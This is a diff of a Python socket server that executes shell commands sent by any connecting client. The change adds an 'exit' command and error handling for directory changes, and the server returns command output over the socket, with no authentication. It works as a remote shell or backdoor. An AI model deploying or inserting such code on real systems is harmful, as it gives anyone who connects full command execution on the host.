@@ -30,10 +30,20 @@ def on_new_client(client, connection):
 	print(f"THe new connection was made from IP: {ip}, and port: {port}!")
 	while True:
                 data = client.recv(1024)
-                if data[:2].decode("utf-8") == 'cd':
-                    os.chdir(data[3:].decode("utf-8"))
+                
+                if data[:4].decode("utf-8") == 'exit':
+                    break
 
-                if len(data) > 0:
+                elif data[:2].decode("utf-8") == 'cd':
+                    try:
+                        os.chdir(data[3:].decode("utf-8"))
+                    except FileNotFoundError as e:
+                        print("Handle file error!")
+                    finally:
+                        currentDir = "Current Directory : " + os.getcwd() + " . "
+                        client.send(str.encode(currentDir))
+
+                elif (len(data) > 0) and (data[:2].decode("utf-8") != 'cd'):
                     cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                     output_byte = cmd.stdout.read() + cmd.stderr.read()
